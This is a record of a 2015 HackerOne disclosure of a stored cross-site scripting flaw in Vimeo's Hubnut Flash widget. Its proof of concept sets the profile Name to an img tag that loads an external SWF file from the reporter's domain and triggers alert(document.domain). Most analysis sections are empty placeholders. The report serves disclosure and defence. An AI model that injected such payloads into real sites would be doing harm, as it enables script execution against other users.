# Stored XSS on vimeo.com and player.vimeo.com

## Metadata
- **Source:** HackerOne
- **Report:** 87577 | https://hackerone.com/reports/87577
- **Submitted:** 2015-09-05
- **Reporter:** stefanovettorazzi
- **Program:** Unknown
- **Bounty:** Not disclosed
- **Severity:** unknown
- **Vuln:** Cross-site Scripting (XSS) - Generic
- **CVEs:** None
- **Category:** web-api

## Summary
__Description__

You can share your uploaded videos using the widget Hubnut. The URL is something like https://player.vimeo.com/hubnut/user/user36690798/uploaded_videos?color=44bbff&background=000000&slideshow=0&video_title=1&video_byline=1, and I noticed that the same content is loaded for this URL https://vimeo.com/hubnut/user/user36690798/uploaded_videos?color=44bbff&background=000000&slidesh

## Attack scenario
*(see original)*

## Root cause
*(see original)*

## Attacker mindset
*(see original)*

## Defensive takeaways
*(see original)*

## Variant hunting
*(see original)*

## MITRE ATT&CK
*(see original)*

## Notes
*(see original)*

## Full report
<details><summary>Expand</summary>

__Description__

You can share your uploaded videos using the widget Hubnut. The URL is something like https://player.vimeo.com/hubnut/user/user36690798/uploaded_videos?color=44bbff&background=000000&slideshow=0&video_title=1&video_byline=1, and I noticed that the same content is loaded for this URL https://vimeo.com/hubnut/user/user36690798/uploaded_videos?color=44bbff&background=000000&slideshow=0&video_title=1&video_byline=1.
The problem is that the Flash file that shows the files uploaded by an user (https://f.vimeocdn.com/p/flash/hubnut/2.0.11/hubnut.swf) renders the Name of the owner of the video without escaping it. This allows to load an external Flash file using the `<img>` tag.

__Proof of concept__

1. Go to https://vimeo.com/settings.
2. Change your _Name_ to `<img src="//u00f1.xyz/xss.swf">`.
3. Click on _Save Changes_.
4. Go to https://vimeo.com/settings/profile.
5. Save, for future use, the editable value of the field _Vimeo URL_ (probably is like *user36690798*).
6. Go to https://player.vimeo.com/hubnut/user/[value_from_step_5] (like: https://player.vimeo.com/hubnut/user/user36690798).
7. `alert(document.domain)` is executed.
8. Go to https://vimeo.com/hubnut/user/[value_from_step_5] (like: https://vimeo.com/hubnut/user/user36690798).
9. `alert(document.domain)` is executed.

Please, let me know if something is not clear.

</details>

---
*Analysed by Claude on 2026-05-31*
